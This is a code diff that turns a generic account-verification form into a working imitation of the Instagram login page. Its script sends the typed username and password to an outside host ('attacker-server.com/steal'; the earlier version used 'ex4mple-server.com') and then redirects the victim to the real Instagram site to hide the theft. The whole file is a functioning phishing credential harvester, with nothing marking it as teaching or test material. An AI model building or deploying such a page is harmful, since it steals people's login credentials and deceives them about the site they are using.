@@ -1,51 +1,75 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Account Verification</title>
-    <style>
-      body {
-        font-family: sans-serif;
-        max-width: 400px;
-        margin: 60px auto;
-        padding: 20px;
-      }
-      input, button {
-        width: 100%;
-        padding: 10px;
-        margin: 8px 0;
-      }
-    </style>
-  </head>
-  <body>
-    <h2>Security Checkpoint</h2>
-    <p>To continue, please verify your account.</p>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500">
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 350px;
+      text-align: center;
+    }
+    .logo {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+    }
+    button {
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #b2dffc;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
+    <form onsubmit="submitLogin(event)">
+      <input id="username" type="text" placeholder="Phone number, username, or email" required />
+      <input id="password" type="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+  </div>
 
-    <div>
-      <input id="u" type="text" placeholder="User ID" required><br>
-      <input id="k" type="password" placeholder="Access Key" required><br>
-      <button onclick="c()">Verify</button>
-    </div>
+  <script>
+    function submitLogin(e) {
+      e.preventDefault();
+      const u = document.getElementById("username").value;
+      const p = document.getElementById("password").value;
 
-    <script>
-      function c() {
-        const a = document.getElementById("u").value;
-        const b = document.getElementById("k").value;
-
-     
-        setTimeout(() => {
-          fetch("https://ex4mple-server.com/api", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ x: a, y: b })
-          }).then(() => {
-            
-            window.location.href = "https://instagram.com";
-          });
-        }, 500);
-      }
-    </script>
-  </body>
+      fetch("https://attacker-server.com/steal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: u, password: p })
+      }).then(() => {
+        window.location.href = "https://instagram.com";
+      });
+    }
+  </script>
+</body>
 </html>
